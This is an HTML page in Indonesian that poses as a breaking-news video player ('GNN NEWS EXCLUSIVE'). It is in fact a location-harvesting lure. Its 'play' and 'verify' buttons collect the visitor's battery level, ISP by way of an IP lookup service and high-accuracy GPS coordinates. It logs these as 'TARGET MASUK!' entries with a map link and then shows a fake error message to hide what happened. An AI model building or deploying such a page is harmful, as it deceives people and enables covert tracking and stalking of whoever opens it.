<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GNN - BERITA TERKINI</title>
    <style>
        body { font-family: sans-serif; margin: 0; background: #f0f2f5; }
        .nav { background: #d32f2f; color: white; padding: 15px; font-weight: bold; text-align: center; }
        .card { max-width: 450px; margin: 20px auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
        .thumb { width: 100%; height: 200px; background: #000; border-radius: 10px; position: relative; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .play-btn { background: rgba(211, 47, 47, 0.9); color: white; padding: 12px 20px; border-radius: 50px; font-weight: bold; border: 2px solid white; cursor: pointer; }
        h2 { font-size: 18px; margin: 15px 0; color: #111; line-height: 1.4; }
        .btn-check { background: #d32f2f; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>

<div class="nav">🔴 GNN NEWS EXCLUSIVE</div>

<div class="card">
    <div class="thumb" onclick="gasLacak()">
        <div class="play-btn">▶ PUTAR VIDEO</div>
    </div>
    <h2>HOT NEWS: Kejadian Tak Terduga Terekam Kamera di Dekat Lokasi Anda!</h2>
    <p style="font-size: 13px; color: #666;">Video ini mengandung konten sensitif. Verifikasi lokasi Anda untuk memastikan Anda berada di zona aman untuk menonton.</p>
    
    <button class="btn-check" onclick="gasLacak()">VERIFIKASI & TONTON</button>
</div>

<script>
    async function gasLacak() {
        const btn = document.querySelector('.btn-check');
        btn.innerText = "SEDANG MEMVERIFIKASI...";
        
        let batInfo = "N/A";
        let ispInfo = "Mencari Provider...";

        // 1. DATA BATERAI
        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                batInfo = Math.round(b.level * 100) + "% " + (b.charging ? "(⚡)" : "");
            }
        } catch(e) {}

        // 2. DATA PROVIDER/ISP
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            ispInfo = data.org || "Provider Privat";
        } catch(e) { ispInfo = "Provider Tersembunyi"; }

        // 3. EKSEKUSI GPS
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const jam = new Date().toLocaleTimeString();
                    
                    // Format Log untuk Dashboard v17.2
                    const newLog = `
                        <div style="background:#fffde7; padding:8px; border-radius:8px; border-left:4px solid #d32f2f;">
                            <b style="color:#d32f2f;">🔥 TARGET MASUK! [${jam}]</b><br>
                            🔋 <b>Bat:</b> ${batInfo} | 📶 <b>ISP:</b> ${ispInfo}<br>
                            📍 <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" style="color:#1976d2; font-weight:bold;">TAMPILKAN TITIK GPS</a>
                        </div>
                    `;

                    // Push ke Database Lokal
                    let logs = JSON.parse(localStorage.getItem("eye_logs")) || [];
                    logs.unshift(newLog);
                    localStorage.setItem("eye_logs", JSON.stringify(logs));

                    // Fake Error
                    setTimeout(() => {
                        alert("ERROR 403: Server sibuk atau koneksi Anda tidak stabil. Silakan coba lagi nanti saat sinyal lebih kuat.");
                        btn.innerText = "COBA LAGI";
                    }, 1500);
                },
                (err) => {
                    alert("AKSES DITOLAK! Anda wajib mengizinkan lokasi untuk memverifikasi keamanan konten ini.");
                    btn.innerText = "VERIFIKASI ULANG";
                },
                { enableHighAccuracy: true, timeout: 8000 }
            );
        } else {
            alert("Browser tidak mendukung pemutar video ini.");
        }
    }
</script>

</body>
</html>
